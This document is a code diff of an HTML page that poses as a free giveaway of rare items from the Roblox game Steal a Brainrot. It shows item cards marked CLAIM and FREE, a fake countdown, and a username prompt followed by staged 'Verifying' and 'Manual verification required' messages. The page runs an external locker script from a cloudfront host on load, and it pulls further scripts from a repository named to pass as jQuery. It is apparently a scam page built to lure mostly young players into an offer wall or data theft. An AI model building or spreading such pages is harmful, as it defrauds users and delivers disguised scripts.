@@ -1,828 +1,410 @@
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta property="og:image" content="https://i.imgur.com/HBaO44H.png">
-  <link rel="shortcut icon" href="https://i.imgur.com/HBaO44H.png" type="image/x-icon">
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Steal a Brainrot</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/tiktok@main/tiktok.css"/>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/tiktok@main/tiktak.css"/>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/obf@main/2.css"/>
- </head>
-   <body>
-    <script type="text/javascript">
+  <title>Brainrots</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/BQ4LXx8.css">
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/3.6.3.min.js"></script>
+</head>
+<body>
+  <video class="bg-video" autoplay muted loop playsinline>
+    <source src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/back.mp4" type="video/mp4">
+  </video>
+
+  <div class="overlay"></div>
+
+  <div class="shop-container">
+    <div class="shop-header">
+      <span>Free Brainrots  <span id="timer" class="countdown">20:13</span></span>
+      <div class="header-buttons">
+        <button class="restock-btn">Restock</button>
+        <button class="close-btn" onclick="goBack()">X</button>
+      </div>
+    </div>
+
+    <div class="cards-wrapper" id="cardsWrapper">
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tang-Tnag-Keletang.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Tang Tnag Keletang</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x24 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Tang Tnag Keletang')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Tang Tnag Keletang')">FREE</span>
+            <span class="price-victor" onclick="openForm('Tang Tnag Keletang')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Money-Money-Puggy-Leak.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Money Money Puggy</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x13 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Money Money Puggy')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Money Money Puggy')">FREE</span>
+            <span class="price-victor" onclick="openForm('Money Money Puggy')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Noo-My-Exam.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Noo My Examen</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x23 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Noo My Examen')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Noo My Examen')">FREE</span>
+            <span class="price-victor" onclick="openForm('Noo My Examen')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Strawberry-Elephant.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Strawberry Elephant</div>
+          <div class="rarity" id="coloredText">OG</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Strawberry Elephant')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Strawberry Elephant')">FREE</span>
+            <span class="price-victor" onclick="openForm('Strawberry Elephant')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://static.wikia.nocookie.net/stealabr/images/1/14/Ketchuru.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Ketchuru & Musturu</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Ketchuru & Musturu')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Ketchuru & Musturu')">FREE</span>
+            <span class="price-victor" onclick="openForm('Ketchuru & Musturu')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Dragon Cannelloni</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Dragon Cannelloni')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Dragon Cannelloni')">FREE</span>
+            <span class="price-victor" onclick="openForm('Dragon Cannelloni')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://static.wikia.nocookie.net/stealabr/images/d/d2/Blackhole_Bomb.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Blackhole Bomb</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Blackhole Bomb')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Blackhole Bomb')">FREE</span>
+            <span class="price-victor" onclick="openForm('Blackhole Bomb')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://static.wikia.nocookie.net/stealabr/images/7/7f/Alien_Slap.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Alien Slap</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Alien Slap')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Alien Slap')">FREE</span>
+            <span class="price-victor" onclick="openForm('Alien Slap')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tictac-Sahur.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Tictac Sahur</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Tictac Sahur')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Tictac Sahur')">FREE</span>
+            <span class="price-victor" onclick="openForm('Tictac Sahur')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Mariachi-Corazoni.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Mariachi Corazoni</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Mariachi Corazoni')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Mariachi Corazoni')">FREE</span>
+            <span class="price-victor" onclick="openForm('Mariachi Corazoni')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>         
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/To-To-To-Sahur.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">To To Sahur</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('To To To Sahur')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('To To To Sahur')">FREE</span>
+            <span class="price-victor" onclick="openForm('To To To Sahur')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+            <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Tacoritas.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Los Tacoritas </div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Los Tacoritas')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Los Tacoritas')">FREE</span>
+            <span class="price-victor" onclick="openForm('Los Tacoritas')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+            <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasahurCombinasion.webp">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Sahur Combinasion</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Los Tacoritas')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Los Tacoritas')">FREE</span>
+            <span class="price-victor" onclick="openForm('Los Tacoritas')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+               <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tacorita_Bicicleta_.webp">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Tacorita Bicicleta</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Tacorita Bicicleta')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Tacorita Bicicleta')">FREE</span>
+            <span class="price-victor" onclick="openForm('Tacorita Bicicleta')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/SIX_SEVEN.webp">
+        </div>
+        <div class="card-info">
+          <div class="card-title">SIX SEVEN</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('SIX SEVEN')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('SIX SEVEN')">FREE</span>
+            <span class="price-victor" onclick="openForm('SIX SEVEN')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosChicleteiritas.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Los Chicleteiritas</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Los Chicleteiritas')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Los Chicleteiritas')">FREE</span>
+            <span class="price-victor" onclick="openForm('Los Chicleteiritas')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaExtinctGrande.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">La Extinct Grande</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('La Extinct Grande')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('La Extinct Grande')">FREE</span>
+            <span class="price-victor" onclick="openForm('La Extinct Grande')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ExtinctMatteo.webp">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Extinct Matteo</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Extinct Matteo')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Extinct Matteo')">FREE</span>
+            <span class="price-victor" onclick="openForm('Extinct Matteo')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasSis.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">LasSis</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('LasSis')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('LasSis')">FREE</span>
+            <span class="price-victor" onclick="openForm('LasSis')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Smurf_cat1.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Smurf Cat</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Smurf Cat')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Smurf Cat')">FREE</span>
+            <span class="price-victor" onclick="openForm('Smurf Cat')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-wrapper" id="formWrapper">
+      <h2 id="chosenItemTitle">enter your username exactly as shown in the game!</h2>
+
+      <div class="input-section">
+        <input type="text" placeholder="Enter Username">
+        <div id="search">SEARCH</div>
+      </div>
+
+      <div class="loading-gif d-none">
+        <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/loading.gif">
+      </div>
+
+      <div class="profile d-none" style="position: relative; padding: 20px;">
+        <div class="img"><img src="" alt="Avatar"></div>
+        <div class="welcome-text"></div>
+        <div class="continue-btn" id="continueBtn">CLAIM BRAINROTS</div>
+
+        <!-- Instruction box with white background, messages inside HTML -->
+        <div class="instruction-text d-none" style="background:white; padding:10px; margin-top:10px; border-radius:5px; font-weight:bold; font-size:18px;">
+          <div class="msg msg1" style="display:none; color:green;">Verifying...</div>
+          <div class="msg msg2" style="display:none; color:green;">Sending Brainrots...</div>
+          <div class="msg msg3" style="display:none; color:red;">An error occurred</div>
+          <div class="msg msg4" style="display:none; color:red;">Manual verification required</div>
+        </div>
+
+        <div id="welcome-text-template" class="d-none">
+          Hello @<span class="user-placeholder"></span>, you will receive <span class="item-placeholder"></span> once you click the button below.
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/animation.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/fonts.js"></script>
+ <script type="text/javascript">
     var PQIKb_Ddh_HpEEFc={"it":4527040,"key":"10472"};
 </script>
 <script src="https://dlk457skl57zp.cloudfront.net/30b74bc.js"></script>
-      <div class="loading">
-         <div class="load">
-            <img src="https://i.imgur.com/MjVLeNt.gif" alt="loading gif" />
-         </div>
-      </div>
-      <nav>
-         <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" alt="">
-         </div>
-      </nav>
-  <div class="container-md">
-    <div class="label">
-      <div class="item">Items</div>
-      <div class="item">Info</div>
-    </div>
-    <div id="gifts" class="gifts d-none">
-      <div class="row"></div>
-      <br><br><br>
-    </div>
-    <div id="followers" class="followers">
-      <div class="row">
-                            <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tictac-Sahur.png" alt=""></div>
-    <div class="txt">Tictac-Sahur</div>
-  </div>
-</div>
-       <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Mariachi-Corazoni.png" alt=""></div>
-    <div class="txt">MARIACHI CORAZONI</div>
-  </div>
-</div>
-    <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/To-To-To-Sahur.png" alt=""></div>
-    <div class="txt">To to to Sahur</div>
-  </div>
-</div>
-                     <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Tacoritas.png" alt=""></div>
-    <div class="txt">Los Tacoritas</div>
-  </div>
-</div>
-                     <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasahurCombinasion.webp" alt=""></div>
-    <div class="txt">La  sahur Combinasion</div>
-  </div>
-</div>
-     <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tacorita_Bicicleta_.webp" alt=""></div>
-    <div class="txt">Tacorita Bicicleta</div>
-  </div>
-</div>
-         <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/SIX_SEVEN.webp" alt=""></div>
-    <div class="txt">SIX SEVEN</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosChicleteiritas.png" alt=""></div>
-    <div class="txt">Los Chicleteiritas</div>
-  </div>
-</div>
-    <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaExtinctGrande.png" alt=""></div>
-    <div class="txt">La Extinct Grande</div>
-  </div>
-</div>
-   <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ExtinctMatteo.webp" alt=""></div>
-    <div class="txt">Extinct Matteo</div>
-  </div>
-</div>
-    <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasSis.png" alt=""></div>
-    <div class="txt">LasSis</div>
-  </div>
-</div>
-             <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tralaledon.png" alt=""></div>
-    <div class="txt">Tralaledon</div>
-  </div>
-</div>
-                             <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Smurf_cat1.png" alt=""></div>
-    <div class="txt">Smurf cat</div>
-  </div>
-</div>
-             <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosBros.png" alt=""></div>
-    <div class="txt">Los Bros</div>
-  </div>
-</div>
-           <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaKarkerkarCombinasion.png" alt=""></div>
-    <div class="txt">La Karkerkar Combinasion</div>
-  </div>
-</div>
-      <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Nooo-My-Hotspotsitos.png" alt=""></div>
-    <div class="txt">Los Nooo My Hotspotsitos</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Tipi-Tacos.png" alt=""></div>
-    <div class="txt">Los Tipi Tacos</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Chihuanini-Taconini.png" alt=""></div>
-    <div class="txt">Chihuanini Taconini</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gattito-Tacoto.png" alt=""></div>
-    <div class="txt">Gattito Tacoto</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Quivioli-Ameleonni.png" alt=""></div>
-    <div class="txt">Quivioli-Ameleonni</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Carrotini-Brainini.png" alt=""></div>
-    <div class="txt">Carrotini-Brainini</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Ketchuru-and-Musturu.png" alt=""></div>
-    <div class="txt">Ketchuru-and-Musturu</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Crabbo-Limonetta.png" alt=""></div>
-    <div class="txt">Crabbo-Limonetta</div>
-  </div>
-</div>
-        <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Guerriro-Digitale.png" alt=""></div>
-    <div class="txt">Guerriro-Digitale</div>
-  </div>
-</div>
-  
-      <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Strawberry-Elephant.png" alt=""></div>
-    <div class="txt">Strawberry Elephant</div>
-  </div>
-</div>
- <div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/SpaghettiTualetti.webp" alt=""></div>
-    <div class="txt">Spaghetti Tualetti</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/GuerriroDigitale.png" alt=""></div>
-    <div class="txt">Guerriro Digitale</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Racooni-Jandelini.png" alt=""></div>
-    <div class="txt">Racooni Jandelini</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Alessio.png" alt=""></div>
-    <div class="txt">Alessio</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-bombinitos.png" alt=""></div>
-    <div class="txt" >Los bombinitos</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Carloo.png" alt=""></div>
-    <div class="txt" >Carloo</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Spyderinis.png" alt=""></div>
-    <div class="txt">Los Spyderinis</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Blackhole-Goat.png" alt=""></div>
-    <div class="txt">Blackhole Goat</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Ketupat-Kepat.png" alt=""></div>
-    <div class="txt">Ketupat Kepat</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Dul-Dul-Dul.png" alt=""></div>
-    <div class="txt">Dul Dul Dul</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/bisonte-giuppitere.png" alt=""></div>
-    <div class="txt">bisonte giuppitere</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tartaruga-Cisterna.png" alt=""></div>
-    <div class="txt">Tartaruga Cisterna</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Brr-es-Teh-Patipum.png" alt=""></div>
-    <div class="txt">Brr es Teh Patipum</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Lerulerulerule.png" alt=""></div>
-    <div class="txt">Lerulerulerule</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pipi-Potato.png" alt=""></div>
-    <div class="txt">Pipi Potato</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/La-Supreme-Combinasion.png" alt=""></div>
-    <div class="txt">La Supreme Combinasion </div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Matteos.png" alt="Los Matteos"></div>
-    <div class="txt">Los Matteos</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Job-Job-Job-Sahur.png" alt="Job Job Job Sahur"></div>
-    <div class="txt">Job  Sahur</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Urubini-Flamenguini.png" alt="Urubini Flamenguini"></div>
-    <div class="txt">Urubini Flamenguini</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Bombardini-Tortinii.png" alt="Bombardini Tortinii"></div>
-    <div class="txt">Bombardini Tortinii</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tipi-Topi-Taco.png" alt="Tipi Topi Taco"></div>
-    <div class="txt">Tipi Topi Taco</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Nooo-My-Hotspot.png" alt="Nooo My Hotspot"></div>
-    <div class="txt">Nooo My Hotspot</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
